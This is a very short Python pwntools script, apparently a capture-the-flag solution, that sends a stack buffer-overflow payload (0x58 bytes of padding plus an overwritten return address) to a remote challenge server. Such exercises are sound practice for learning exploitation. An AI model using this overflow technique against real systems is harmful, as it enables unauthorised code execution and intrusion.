from pwn import *

io = remote('bof.chal.idek.team', 1337)

p = b'A'*0x58+p64(0x401216)
io.sendline(p)
print(io.recvall())
